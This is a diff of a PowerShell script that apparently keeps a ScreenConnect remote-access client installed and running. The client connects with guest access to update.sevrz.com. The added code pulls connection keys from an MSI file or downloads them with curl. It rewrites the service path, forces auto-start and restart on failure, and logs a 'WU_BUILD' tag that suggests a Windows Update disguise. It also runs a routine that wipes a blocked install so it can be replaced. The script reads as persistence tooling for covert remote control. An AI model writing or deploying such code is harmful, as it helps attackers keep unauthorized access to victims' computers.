@@ -469,18 +469,21 @@ function Get-ScBinaryHealth {
 }
 
 function Test-ScControlBroken {
-    # "Broken" = primary SC is present but gutted/unusable.
-    # Not installed at all is NOT broken — that path uses Install-PrimarySc.
+    # "Broken" = primary SC binaries are gutted/unusable.
+    # Stopped service with healthy files is NOT broken — ENSURE should sc start, not nuclear.
     $h = Get-ScBinaryHealth
     $present = [bool](Test-ScServicePresent) -or ($h.Roots.Count -gt 0) -or ($h.ExeCount -gt 0)
     if (-not $present) { return $false }
-    if (-not $h.ServiceRunning) { return $true }
     if ($h.Roots.Count -eq 0) { return $true }
     if ($h.ExeCount -lt 1) { return $true }
     if ($h.Stubbed) { return $true }
+    if ($h.SvcExeSize -gt 0 -and $h.SvcExeSize -lt 40000) { return $true }
     foreach ($line in $h.ExeDetail) {
         if ($line -match 'readable=False' -or $line -match 'size=0') { return $true }
     }
+    # Healthy files on disk — even if service stopped / no process yet
+    if ($h.SvcExeSize -ge 50000) { return $false }
+    if (-not $h.ServiceRunning) { return $true }
     if ($h.ProcCount -lt 1) { return $true }
     return $false
 }
@@ -559,10 +562,21 @@ function Get-ScConnectionArgsFromMsi {
         $bytes = [IO.File]::ReadAllBytes($MsiPath)
         foreach ($enc in @([Text.Encoding]::Unicode, [Text.Encoding]::ASCII)) {
             $t = $enc.GetString($bytes)
-            $m = [regex]::Match($t, '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&[^"\x00\s]{30,8000}')
+            # Stop at end of k= blob — do NOT gobble following MSI GUID junk (caused 1067 crashes)
+            $m = [regex]::Match($t, '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&k=[A-Za-z0-9%+/=]{100,2000}')
+            if (-not $m.Success) {
+                $m = [regex]::Match($t, '\?h=update\.sevrz\.com&p=443&k=[A-Za-z0-9%+/=]{100,2000}')
+            }
             if ($m.Success) {
-                $args = $m.Value -replace '[^\x20-\x7E].*$', ''
-                if ($args.Length -gt 40) {
+                $args = $m.Value
+                if ($args -notlike '?e=Access*') {
+                    $args = '?e=Access&y=Guest&' + $args.TrimStart('?')
+                }
+                # Trim any trailing non-base64 junk
+                if ($args -match '^(\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&k=[A-Za-z0-9%+/=]+)') {
+                    $args = $Matches[1]
+                }
+                if ($args.Length -gt 80 -and $args -notmatch '\{[0-9A-F]{8}-') {
                     Write-Log ("REPAIR: scraped MSI service args len=" + $args.Length)
                     return $args
                 }
@@ -737,10 +751,17 @@ function Get-ScArgsFromDrop {
             & curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "$dest" "$u" >$null 2>&1
             if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 40)) {
                 $a = (Get-Content $dest -Raw).Trim()
-                if ($a -like '?e=Access*') {
+                # Reject corrupted args that contain MSI GUID junk
+                if ($a -like '?e=Access*' -and $a -match '&k=[A-Za-z0-9%+/=]+$' -and $a -notmatch '\{[0-9A-F]{8}-') {
                     Write-Log ("REPAIR: drop args len=" + $a.Length)
                     return $a
                 }
+                if ($a -like '?h=update.sevrz.com*' -and $a -match '&k=[A-Za-z0-9%+/=]+$') {
+                    $a = '?e=Access&y=Guest&' + $a.TrimStart('?')
+                    Write-Log ("REPAIR: drop args (normalized) len=" + $a.Length)
+                    return $a
+                }
+                Write-Log ("REPAIR: drop args rejected len=" + $a.Length)
             }
         } catch {}
     }
@@ -1770,7 +1791,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730K'
+Write-Log 'WU_BUILD_20260730L'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -2157,6 +2178,29 @@ function Install-PrimarySc {
 
 function Start-PrimaryService {
     if (-not (Test-ScServicePresent)) { return $false }
+    # Re-assert clean ImagePath (reject GUID-junk args that crash with 1067)
+    try {
+        $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+        $bad = $false
+        if ($svc -and $svc.PathName -match '\{[0-9A-F]{8}-') { $bad = $true }
+        if ($svc -and $svc.PathName -notmatch '&k=[A-Za-z0-9%+/=]+"?\s*$' -and $svc.PathName -match '\|ScreenConnect') { $bad = $true }
+        if ($bad -or -not $svc.PathName) {
+            Write-Log 'REPAIR: fixing corrupted ImagePath before start'
+            $args = Get-ScArgsFromDrop
+            if (-not $args) { $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiFile }
+            if (-not $args) {
+                $f = Join-Path $WorkDir 'sc_args.txt'
+                if (Test-Path $f) { $args = (Get-Content $f -Raw).Trim() }
+            }
+            $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
+            if ($args -and (Test-Path $exe)) {
+                $img = '"{0}" "{1}"' -f $exe, $args
+                & sc.exe config "$SvcName" binPath= $img >$null 2>&1
+                Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
+                Write-Log "REPAIR: ImagePath fixed len_args=$($args.Length)"
+            }
+        }
+    } catch {}
     & sc.exe config "$SvcName" start= auto >$null 2>&1
     & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
     if (-not (Test-ScServiceRunning)) {
